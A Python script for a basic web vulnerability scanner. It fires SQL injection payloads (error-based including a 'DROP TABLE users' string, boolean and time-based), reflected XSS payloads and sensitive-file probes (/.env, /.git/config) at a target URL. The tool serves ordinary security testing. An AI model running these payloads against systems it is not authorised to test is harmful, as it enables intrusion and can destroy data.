import requests
import sys
import urllib.parse
import re
from colorama import Fore, Style, init

init(autoreset=True)

# ----- Payloads -----



# These strings try to inject JavaScript into the page
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
]

# Security headers every website should have
important_headers = {
    "Content-Security-Policy":   "blocks XSS attacks",
    "X-Frame-Options":           "prevents clickjacking",
    "X-Content-Type-Options":    "stops MIME sniffing",
    "Strict-Transport-Security": "forces HTTPS",
    "Referrer-Policy":           "controls referrer info",
}

# Common sensitive files that should NOT be public
sensitive_paths = [
    "/.env",
    "/.git/config",
    "/admin",
    "/phpinfo.php",
    "/backup.zip",
    "/config.php",
    "/.htaccess",
    "/wp-admin",
]




# ----- Helper print functions -----

def good(msg):
    print(f"  {Fore.GREEN}[OK]{Style.RESET_ALL}   {msg}")

def bad(msg, detail=""):
    print(f"  {Fore.RED}[!!]{Style.RESET_ALL}   {msg}")
    if detail:
        print(f"         {Fore.WHITE}{detail}{Style.RESET_ALL}")

def info(msg):
    print(f"  {Fore.CYAN}[..]{Style.RESET_ALL}   {msg}")

def warn(msg):
    print(f"  {Fore.YELLOW}[??]{Style.RESET_ALL}   {msg}")

def section(title):
    print(f"\n{Fore.YELLOW}--- {title} ---{Style.RESET_ALL}")


# ----- Step 1: Basic info about the site -----

def get_site_info(url, session):
    section("Basic site info")
    try:
        r = session.get(url, timeout=10)
        info(f"Status:      {r.status_code}")
        info(f"Server:      {r.headers.get('Server', 'hidden')}")
        info(f"Powered by:  {r.headers.get('X-Powered-By', 'hidden')}")
        info(f"Responded in {r.elapsed.total_seconds():.2f}s")
        return r
    except Exception as e:
        print(f"{Fore.RED}Could not connect: {e}{Style.RESET_ALL}")
        sys.exit(1)


# ----- Step 2: Check security headers -----

def check_headers(response):
    section("Security headers")
    missing = []

    for header, what_it_does in important_headers.items():
        if header in response.headers:
            good(header)
        else:
            warn(f"Missing: {header}  ({what_it_does})")
            missing.append(header)

    return missing


# ----- Step 3: Test for SQL injection -----
def check_sql(url, session):
    
    section("SQL Injection")

    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)

    if not params:
        warn("No URL parameters found")
        return []

    # ── Payload sets by technique ────────────────────────────────────────────

    error_payloads = [
        "'",                        # bare quote — simplest trigger
        "''",                       # double quote
        "' OR '1'='1",
        "' OR 1=1 --",
        "\" OR \"1\"=\"1",
        "'; DROP TABLE users; --",
        "' UNION SELECT NULL --",
        "' UNION SELECT NULL, NULL --",
        "' AND 1=CONVERT(int,'a') --",  # MSSQL type error
    ]

    boolean_payloads = [
        ("' AND '1'='1",  "' AND '1'='2"),   # true vs false
        ("' OR '1'='1",   "' OR '1'='2"),
        ("1 AND 1=1",     "1 AND 1=2"),
    ]

    time_payloads = [
        ("1' AND SLEEP(3) --",            3),   # MySQL
        ("1'; WAITFOR DELAY '0:0:3' --",  3),   # MSSQL
        ("1' AND pg_sleep(3) --",          3),   # PostgreSQL
    ]

    # ── Database error patterns ──────────────────────────────────────────────

    error_signs = [
        r"you have an error in your sql syntax",
        r"warning: mysql",
        r"mysql_fetch",
        r"unclosed quotation mark",
        r"quoted string not properly terminated",
        r"syntax error.*sql",
        r"microsoft ole db provider",
        r"ora-\d{5}",            # Oracle
        r"pg::syntaxerror",      # PostgreSQL
        r"sqlite3::exception",   # SQLite
        r"supplied argument is not a valid mysql",
        r"column count doesn't match",
    ]

    found = []

    # ── Helper: build a test URL with one param swapped ──────────────────────

    def build_url(param, value):
        tp = dict(params)
        tp[param] = value
        return urllib.parse.urlunparse(
            parsed._replace(query=urllib.parse.urlencode(tp, doseq=True))
        )

    for param in params:
        info(f"Testing parameter: '{param}'")
        already_found = False   # stop testing once we confirm a vuln

        # ── Technique 1: Error-based ─────────────────────────────────────────
        info("  → error-based detection")

        for payload in error_payloads:
            if already_found:
                break
            try:
                r = session.get(build_url(param, payload), timeout=10)
                body = r.text.lower()

                for sign in error_signs:
                    if re.search(sign, body):
                        bad(
                            f"'{param}' is vulnerable (error-based SQLi)",
                            f"payload : {payload}"
                        )
                        found.append({
                            "param":     param,
                            "payload":   payload,
                            "technique": "error-based",
                        })
                        already_found = True
                        break

            except Exception:
                continue

        # ── Technique 2: Boolean-based ───────────────────────────────────────
        if not already_found:
            info("  → boolean-based detection")

            try:
                # Get the baseline response for this param
                baseline = session.get(url, timeout=10)
                baseline_len = len(baseline.text)

                for true_p, false_p in boolean_payloads:
                    if already_found:
                        break
                    r_true  = session.get(build_url(param, true_p),  timeout=10)
                    r_false = session.get(build_url(param, false_p), timeout=10)

                    len_true  = len(r_true.text)
                    len_false = len(r_false.text)

                    # True condition ≈ baseline, false condition noticeably different
                    matches_baseline = abs(len_true  - baseline_len) < 50
                    false_differs    = abs(len_true  - len_false)   > 100

                    if matches_baseline and false_differs:
                        bad(
                            f"'{param}' is vulnerable (boolean-based SQLi)",
                            f"true response: {len_true}B  |  false response: {len_false}B"
                        )
                        found.append({
                            "param":     param,
                            "payload":   true_p,
                            "technique": "boolean-based",
                        })
                        already_found = True

            except Exception:
                pass

        # ── Technique 3: Time-based ──────────────────────────────────────────
        if not already_found:
            info("  → time-based detection")

            for payload, delay in time_payloads:
                if already_found:
                    break
                try:
                    r = session.get(
                        build_url(param, payload),
                        timeout=delay + 5   # give it enough time to sleep
                    )
                    elapsed = r.elapsed.total_seconds()

                    if elapsed >= delay:
                        bad(
                            f"'{param}' is vulnerable (time-based blind SQLi)",
                            f"response took {elapsed:.1f}s with SLEEP({delay}) payload"
                        )
                        found.append({
                            "param":     param,
                            "payload":   payload,
                            "technique": "time-based",
                        })
                        already_found = True

                except Exception:
                    continue

    if not found:
        good("No SQL injection signs found")

    return found



# ----- Step 4: Test for XSS -----

def check_xss(url, session):
    section("XSS (Cross-Site Scripting)")

    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)

    if not params:
        warn("No URL parameters to test")
        return []

    found = []

    for param in params:
        info(f"Testing: {param}")
        for payload in xss_payloads:

            test_params = dict(params)
            test_params[param] = payload
            test_url = urllib.parse.urlunparse(
                parsed._replace(query=urllib.parse.urlencode(test_params, doseq=True))
            )

            try:
                r = session.get(test_url, timeout=10)

                # If our script tag came back in the page unchanged, it'll run in a browser
                if payload in r.text:
                    bad(f"'{param}' reflects the payload unescaped!", f"payload: {payload}")
                    found.append({"param": param, "payload": payload})
                    break  # One hit per param is enough

            except Exception:
                pass

    if not found:
        good("No reflected XSS found")

    return found


# ----- Step 5: Check for exposed sensitive files -----

def check_files(url, session):
    section("Sensitive files")

    # Only keep the domain, drop any path
    parsed = urllib.parse.urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"

    found = []

    for path in sensitive_paths:
        full_url = base + path
        try:
            r = session.get(full_url, timeout=8, allow_redirects=False)
            if r.status_code == 200:
                bad(f"Exposed! {full_url}")
                found.append(full_url)
            else:
                good(f"{path}  ({r.status_code})")
        except Exception:
            good(f"{path}  (unreachable)")

    return found


# ----- Final summary -----

def print_summary(url, missing_headers, sql_issues, xss_issues, exposed_files):
    section("Summary")
    print(f"  Target: {url}\n")

    total = len(missing_headers) + len(sql_issues) + len(xss_issues) + len(exposed_files)

    if total == 0:
        print(f"  {Fore.GREEN}All clear! Nothing obvious found.{Style.RESET_ALL}")
        return

    print(f"  {Fore.RED}Found {total} issue(s):{Style.RESET_ALL}\n")

    if missing_headers:
        print(f"  {Fore.YELLOW}Missing headers:{Style.RESET_ALL}")
        for h in missing_headers:
            print(f"    - {h}")

    if sql_issues:
        print(f"\n  {Fore.RED}SQL injection:{Style.RESET_ALL}")
        for v in sql_issues:
            print(f"    - param '{v['param']}' with: {v['payload']}")

    if xss_issues:
        print(f"\n  {Fore.RED}XSS:{Style.RESET_ALL}")
        for v in xss_issues:
            print(f"    - param '{v['param']}' with: {v['payload']}")

    if exposed_files:
        print(f"\n  {Fore.RED}Exposed files:{Style.RESET_ALL}")
        for f in exposed_files:
            print(f"    - {f}")

    


# ----- Main: put it all together -----

def main():
    print(f"\n{Fore.CYAN} Web Vulnerability Scanner {Style.RESET_ALL}")
    

    if len(sys.argv) < 2:
        print("Usage:   python scanner.py <url>")
        print("Example: python scanner.py http://testphp.vulnweb.com/listproducts.php?cat=1")
        sys.exit(1)

    url = sys.argv[1]

    # Add http:// if the user forgot it
    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    # Use a session so we send the same headers every time
    session = requests.Session()
    session.headers["User-Agent"] = "Mozilla/5.0 "

    # Run each check
    response        = get_site_info(url, session)
    missing_headers = check_headers(response)
    sql_issues      = check_sql(url, session)
    xss_issues      = check_xss(url, session)
    exposed_files   = check_files(url, session)

    # Show what we found
    print_summary(url, missing_headers, sql_issues, xss_issues, exposed_files)


if __name__ == "__main__":
    main()